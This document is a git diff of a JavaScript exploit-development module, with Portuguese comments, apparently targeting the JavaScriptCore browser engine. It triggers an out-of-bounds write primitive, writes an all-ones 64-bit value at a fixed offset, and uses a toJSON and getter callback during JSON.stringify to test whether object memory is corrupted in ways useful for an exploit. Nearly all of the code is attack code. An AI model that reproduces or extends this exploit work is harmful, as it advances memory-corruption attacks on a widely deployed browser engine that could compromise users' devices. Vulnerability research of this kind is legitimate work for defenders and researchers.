@@ -11,66 +11,79 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterOnComplex"; // Getter será em ComplexCheckpoint
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForMethodCallTest";
 let getter_called_flag = false;
 let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };
 
 const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-class ComplexCheckpoint {
+class CheckpointWithMethod {
     constructor(id) {
-        this.id_marker = `ComplexCheckpointInstance-${id}`;
-        this.numeric_prop = 0x11223344;
-        this.string_prop = "InitialString";
-        this.object_prop = { a: 10, b: 20 };
-        this.array_prop = [100, 200, 300];
+        this.id_marker = `CheckpointWithMethod-${id}`;
+        this.data = 0x12345678;
+    }
+
+    // Método que vamos tentar chamar no getter
+    performAction() {
+        logS3(`CheckpointWithMethod.performAction CALLED! Data: ${toHex(this.data)}`, "good", "performAction");
+        return this.data + 1;
+    }
+
+    // Propriedade com getter que será acionada por toJSON
+    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
+        getter_called_flag = true;
+        const FNAME_GETTER = "MethodCallTest_Getter";
+        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
+        current_test_results = { success: false, message: "Getter chamado, tentando chamar this.performAction().", error: null, details: "" };
+
         try {
-            this.arraybuffer_prop = new ArrayBuffer(32); // Um ArrayBuffer como propriedade
-            new DataView(this.arraybuffer_prop).setUint32(0, 0xABABABAB, true);
+            logS3("DENTRO DO GETTER: Tentando chamar this.performAction()...", "info", FNAME_GETTER);
+            const action_result = this.performAction(); // Chama o método no 'this'
+            logS3(`DENTRO DO GETTER: this.performAction() retornou: ${toHex(action_result)} (Esperado: ${toHex(0x12345678 + 1)})`, "info", FNAME_GETTER);
+
+            if (action_result === (0x12345678 + 1)) {
+                current_test_results.message = "this.performAction() chamado com sucesso, objeto parece íntegro.";
+                current_test_results.success = false; // Sucesso aqui significa que *não* houve corrupção útil para exploit
+            } else {
+                current_test_results.message = `this.performAction() retornou valor inesperado: ${toHex(action_result)}.`;
+                current_test_results.success = true; // Resultado inesperado pode ser interessante
+                logS3(`DENTRO DO GETTER: Resultado inesperado de performAction!`, "vuln", FNAME_GETTER);
+            }
+            current_test_results.details = `Resultado da ação: ${toHex(action_result)}`;
+
         } catch (e) {
-            logS3(`Erro ao criar arraybuffer_prop no construtor: ${e.message}`, "error", "ComplexCheckpoint");
-            this.arraybuffer_prop = null;
+            logS3(`DENTRO DO GETTER: ERRO ao chamar this.performAction(): ${e.message}`, "error", FNAME_GETTER);
+            current_test_results.success = true; // Erro ao chamar método também é interessante
+            current_test_results.error = String(e);
+            current_test_results.message = `Erro ao chamar this.performAction(): ${e.message}`;
         }
-        // A propriedade GETTER_CHECKPOINT_PROPERTY_NAME será adicionada ao protótipo
-    }
-
-    // Um método simples para verificar integridade básica se necessário
-    checkSelf() {
-        return `ID: ${this.id_marker}, AB Prop: ${this.arraybuffer_prop ? this.arraybuffer_prop.byteLength : 'null'}`;
+        return 0xBADF00D; // Valor de retorno do getter
     }
 }
 
-export function toJSON_TriggerComplexGetter() { // Esta será a toJSON de ComplexCheckpoint
-    const FNAME_toJSON = "toJSON_TriggerComplexGetter";
-    logS3(`toJSON_TriggerComplexGetter para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
-    try {
-        // eslint-disable-next-line no-unused-vars
-        const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter no próprio this
-    } catch (e) {
-        logS3(`toJSON_TriggerComplexGetter: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
-    }
-    // Para JSON.stringify continuar, ele precisa de um objeto serializável ou valor primitivo.
-    // Retornar apenas algumas propriedades para evitar recursão infinita se algo estiver muito quebrado.
-    return {
-        id: this.id_marker,
-        processed_by: FNAME_toJSON
-    };
-}
+// toJSON será agora um método do CheckpointWithMethod
+CheckpointWithMethod.prototype.toJSON = function() {
+    const FNAME_toJSON = "CheckpointWithMethod.toJSON";
+    logS3(`toJSON para: ${this.id_marker}. Acessando getter para acionar lógica de teste...`, "info", FNAME_toJSON);
+    // Acessar a propriedade com getter para acionar a lógica de teste
+    // eslint-disable-next-line no-unused-vars
+    const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
+    return { id: this.id_marker, custom_json: true }; // Retorno simples para JSON.stringify
+};
+
 
 export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST = "executeComplexCheckpointTest"; // Nome interno
-    logS3(`--- Iniciando Teste com Checkpoint_obj Complexo ---`, "test", FNAME_TEST);
+    const FNAME_TEST = "executeMethodCallTest"; // Nome interno
+    logS3(`--- Iniciando Teste de Chamada de Método no Getter ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
     current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };
 
     if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }
 
-    let toJSONPollutionAppliedOnProto = false; // Não vamos poluir Object.prototype desta vez
-    let getterPollutionAppliedOnProto = false;
-    let originalToJSONComplexProtoDesc = null;
-    let originalGetterDesc = null;
+    // Não precisamos mais poluir Object.prototype.toJSON ou o protótipo de CheckpointWithMethod aqui,
+    // pois toJSON e o getter são definidos diretamente na classe/protótipo.
 
     try {
         await triggerOOB_primitive();
@@ -81,86 +94,19 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
         oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
         logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);
 
-        // 2. Criar e configurar o ComplexCheckpoint
-        const complex_checkpoint_obj = new ComplexCheckpoint(1);
-        logS3(`ComplexCheckpoint objeto criado. ID: ${complex_checkpoint_obj.id_marker}, AB Length: ${complex_checkpoint_obj.arraybuffer_prop?.byteLength}`, "info", FNAME_TEST);
+        // 2. Criar o objeto CheckpointWithMethod
+        const checkpoint_obj_with_method = new CheckpointWithMethod(1);
+        logS3(`CheckpointWithMethod objeto criado. ID: ${checkpoint_obj_with_method.id_marker}`, "info", FNAME_TEST);
 
-        // Salvar descritores originais do protótipo de ComplexCheckpoint
-        originalToJSONComplexProtoDesc = Object.getOwnPropertyDescriptor(ComplexCheckpoint.prototype, 'toJSON');
-        originalGetterDesc = Object.getOwnPropertyDescriptor(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
-
-        // Definir toJSON e o getter diretamente no protótipo de ComplexCheckpoint
-        Object.defineProperty(ComplexCheckpoint.prototype, 'toJSON', {
-            value: toJSON_TriggerComplexGetter,
-            writable: true, enumerable: false, configurable: true
-        });
-        toJSONPollutionAppliedOnProto = true;
-
-        Object.defineProperty(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
-            get: function() { // Getter SÍNCRONO
-                getter_called_flag = true;
-                const FNAME_GETTER = "ComplexCheckpoint_Getter";
-                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
-                
-                let details = [];
-                let corruption_found = false;
-                try {
-                    details.push(`ID: ${this.id_marker} (Esperado: ComplexCheckpointInstance-1)`);
-                    details.push(`Numeric Prop: ${toHex(this.numeric_prop)} (Esperado: ${toHex(0x11223344)})`);
-                    details.push(`String Prop: "${this.string_prop}" (Esperado: "InitialString")`);
-                    details.push(`Object Prop Keys: ${this.object_prop ? Object.keys(this.object_prop).join(',') : 'null'} (Esperado: a,b)`);
-                    details.push(`Array Prop Length: ${this.array_prop ? this.array_prop.length : 'null'} (Esperado: 3)`);
-                    
-                    if (this.arraybuffer_prop) {
-                        details.push(`AB Prop byteLength: ${this.arraybuffer_prop.byteLength} (Esperado: 32)`);
-                        if (this.arraybuffer_prop.byteLength !== 32) {
-                            corruption_found = true;
-                            logS3("CORRUPÇÃO: this.arraybuffer_prop.byteLength alterado!", "vuln", FNAME_GETTER);
-                        }
-                        try {
-                            const dv = new DataView(this.arraybuffer_prop);
-                            details.push(`AB Prop[0] (u32): ${toHex(dv.getUint32(0,true))} (Esperado: ${toHex(0xABABABAB)})`);
-                            if (dv.getUint32(0,true) !== 0xABABABAB) {
-                                corruption_found = true;
-                                logS3("CORRUPÇÃO: Conteúdo de this.arraybuffer_prop alterado!", "vuln", FNAME_GETTER);
-                            }
-                        } catch (e_dv) {
-                            details.push(`AB Prop: Erro ao usar DataView: ${e_dv.message}`);
-                            corruption_found = true;
-                            logS3(`CORRUPÇÃO: Erro ao usar DataView em this.arraybuffer_prop: ${e_dv.message}`, "vuln", FNAME_GETTER);
-                        }
-                    } else {
-                        details.push("AB Prop é null!");
-                        corruption_found = true; // Se era esperado e agora é null
-                         logS3("CORRUPÇÃO: this.arraybuffer_prop é null!", "vuln", FNAME_GETTER);
-                    }
-
-                    if (corruption_found) {
-                        current_test_results = { success: true, message: "Corrupção observada nas propriedades de ComplexCheckpoint!", error: null, details: details.join('; ') };
-                    } else {
-                        current_test_results = { success: false, message: "Nenhuma corrupção óbvia nas propriedades de ComplexCheckpoint.", error: null, details: details.join('; ') };
-                    }
-
-                } catch (e) {
-                    logS3(`DENTRO DO GETTER: ERRO GERAL ao inspecionar 'this': ${e.message}`, "error", FNAME_GETTER);
-                    current_test_results = { success: false, message: `Erro geral inspecionando 'this': ${e.message}`, error: String(e), details: details.join('; ') };
-                }
-                return 0xBADF00D; // Getter precisa retornar algo
-            },
-            configurable: true
-        });
-        getterPollutionAppliedOnProto = true;
-        logS3(`toJSON e getter definidos no protótipo de ComplexCheckpoint.`, "info", FNAME_TEST);
-
-        // 3. Chamar JSON.stringify no objeto complexo
-        logS3(`Chamando JSON.stringify(complex_checkpoint_obj)...`, "info", FNAME_TEST);
+        // 3. Chamar JSON.stringify
+        logS3(`Chamando JSON.stringify(checkpoint_obj_with_method)...`, "info", FNAME_TEST);
         let stringify_result = null;
         try {
-            stringify_result = JSON.stringify(complex_checkpoint_obj);
+            stringify_result = JSON.stringify(checkpoint_obj_with_method);
             logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
         } catch (e) {
             logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
-            if (!getter_called_flag) { // Se o erro ocorreu antes do getter
+            if (!getter_called_flag) {
                  current_test_results.message = `Erro em JSON.stringify antes do getter: ${e.message}`;
                  current_test_results.error = String(e);
             }
@@ -171,30 +117,23 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
         console.error(mainError);
         current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), details:"" };
     } finally {
-        // Restauração
-        if (toJSONPollutionAppliedOnProto && ComplexCheckpoint.prototype.hasOwnProperty('toJSON')) {
-            delete ComplexCheckpoint.prototype.toJSON;
-            if(originalToJSONComplexProtoDesc) Object.defineProperty(ComplexCheckpoint.prototype, 'toJSON', originalToJSONComplexProtoDesc);
-        }
-        if (getterPollutionAppliedOnProto && ComplexCheckpoint.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) {
-             delete ComplexCheckpoint.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
-            if(originalGetterDesc) Object.defineProperty(ComplexCheckpoint.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
-        }
-        logS3("Limpeza de protótipo de ComplexCheckpoint finalizada.", "info", "CleanupFinal");
+        // Nenhuma poluição de protótipo global para limpar aqui,
+        // mas poderíamos restaurar ComplexCheckpoint.prototype.toJSON/getter se quiséssemos ser ultra-limpos
+        // para múltiplos testes na mesma página sem recarregar.
+        logS3("Limpeza (se houver) finalizada.", "info", "CleanupFinal");
     }
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TESTE COMPLEX CHECKPOINT: ${current_test_results.message}`, "vuln", FNAME_TEST);
+            logS3(`RESULTADO TESTE CHAMADA MÉTODO: ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "vuln", FNAME_TEST);
         } else {
-            logS3(`RESULTADO TESTE COMPLEX CHECKPOINT: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
+            logS3(`RESULTADO TESTE CHAMADA MÉTODO: Getter chamado. ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "warn", FNAME_TEST);
         }
-        logS3(`Detalhes da inspeção do ComplexCheckpoint: ${current_test_results.details}`, "info", FNAME_TEST);
     } else {
-        logS3("RESULTADO TESTE COMPLEX CHECKPOINT: Getter NÃO foi chamado.", "error", FNAME_TEST);
+        logS3("RESULTADO TESTE CHAMADA MÉTODO: Getter NÃO foi chamado.", "error", FNAME_TEST);
     }
     // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
 
     clearOOBEnvironment();
-    logS3(`--- Teste com Checkpoint_obj Complexo Concluído ---`, "test", FNAME_TEST);
+    logS3(`--- Teste de Chamada de Método no Getter Concluído ---`, "test", FNAME_TEST);
 }
